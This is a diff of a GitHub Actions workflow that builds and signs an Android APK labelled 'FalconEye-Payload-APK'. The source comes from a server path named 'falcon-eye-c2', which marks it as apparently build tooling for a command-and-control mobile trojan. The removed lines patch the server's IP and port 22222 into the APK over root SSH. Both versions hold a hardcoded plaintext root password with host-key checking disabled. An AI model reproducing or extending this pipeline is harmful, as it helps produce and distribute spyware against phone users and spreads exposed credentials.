@@ -11,20 +11,37 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Install sshpass
-        run: sudo apt-get update && sudo apt-get install -y sshpass
+      - name: Setup Java
+        uses: actions/setup-java@v3
+        with:
+          distribution: 'temurin'
+          java-version: '8'
 
-      - name: Trigger Remote Build on VPS
-        run: |
-          sshpass -p 'n036mKelPVXd' ssh -o StrictHostKeyChecking=no root@77.105.133.37 "cd /opt/falcon-eye-c2/server && node -e \"const apkBuilder = require('./includes/apkBuilder'); apkBuilder.patchAPK('77.105.133.37', '22222', (err) => { if(err) console.error(err); else apkBuilder.buildAPK((err) => { if(err) console.error(err); else console.log('BUILD_DONE'); }) });\""
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v2
 
-      - name: Download APK from VPS
+      - name: Install dependencies
         run: |
+          sudo apt-get update
+          sudo apt-get install -y wget unzip
+          wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -O apktool.jar
+          wget https://github.com/patrickfav/uber-adb-tools/releases/download/v1.3.1/uber-apk-signer-1.3.0.jar -O sign.jar
+
+      - name: Download source from VPS
+        run: |
+          sudo apt-get install -y sshpass
+          mkdir -p payload_source
+          sshpass -p 'n036mKelPVXd' scp -o StrictHostKeyChecking=no -r root@77.105.133.37:/opt/falcon-eye-c2/server/app/factory/decompiled/* ./payload_source/
+
+      - name: Build APK
+        run: |
+          java -jar apktool.jar b ./payload_source -o unsigned.apk
+          java -jar sign.jar -a unsigned.apk --allowResign
           mkdir -p app/build/outputs/apk/debug/
-          sshpass -p 'n036mKelPVXd' scp -o StrictHostKeyChecking=no root@77.105.133.37:/opt/falcon-eye-c2/server/assets/webpublic/build.s.apk app/build/outputs/apk/debug/FalconEye.apk
+          mv unsigned-aligned-debugSigned.apk app/build/outputs/apk/debug/FalconEye.apk
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
           name: FalconEye-Payload-APK
-          path: app/build/outputs/apk/debug/*.apk
+          path: app/build/outputs/apk/debug/FalconEye.apk
